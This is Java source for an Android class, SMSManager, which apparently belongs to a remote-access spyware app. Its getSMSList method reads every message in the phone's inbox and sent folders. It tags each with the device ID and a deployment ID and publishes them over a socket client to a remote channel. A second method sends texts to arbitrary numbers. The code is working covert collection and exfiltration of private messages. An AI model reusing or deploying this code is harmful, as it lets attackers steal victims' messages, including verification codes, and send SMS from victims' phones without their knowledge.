package com.gnu.cobat;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import io.github.centrifugal.centrifuge.Client;

public class SMSManager {

    public static JSONObject getSMSList(Client ioSocket){

        TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = telephonyManager.getDeviceId();

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            String[] uris = {"content://sms/inbox", "content://sms/sent"};

            for (String uri : uris) {

                // accessing each element of array
                // String filter = "date>=" + dateStart.getTime();
                Uri uriSMSURI = Uri.parse(uri);
                Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, "date desc");

                while (cur.moveToNext()) {
                    try {
                        JSONObject sms = new JSONObject();

                        for (int i = 0; i < cur.getColumnCount(); i++) {
                            String colName = cur.getColumnName(i);
                            if ( colName.equals("_id") ) {
                                continue;
                            }
                            if ( colName.equals("date") || colName.equals("date_sent") ) {
                                long val = Long.parseLong(cur.getString(i));
                                sms.put(cur.getColumnName(i), val);
                            } else {
                                sms.put(cur.getColumnName(i), cur.getString(i));
                            }
                        }

                        sms.put("original_id", cur.getString(cur.getColumnIndex("_id")));
                        sms.put("deploy_id", Global.deploy_id);
                        sms.put("device_id", deviceID);
                        sms.put("return", true);
                        sms.put("return_type", "cb-sms");
                        ioSocket.publish(Global.channel, sms.toString().getBytes(), null);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }

            Log.e("done" ,"collecting");
            return SMSList;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
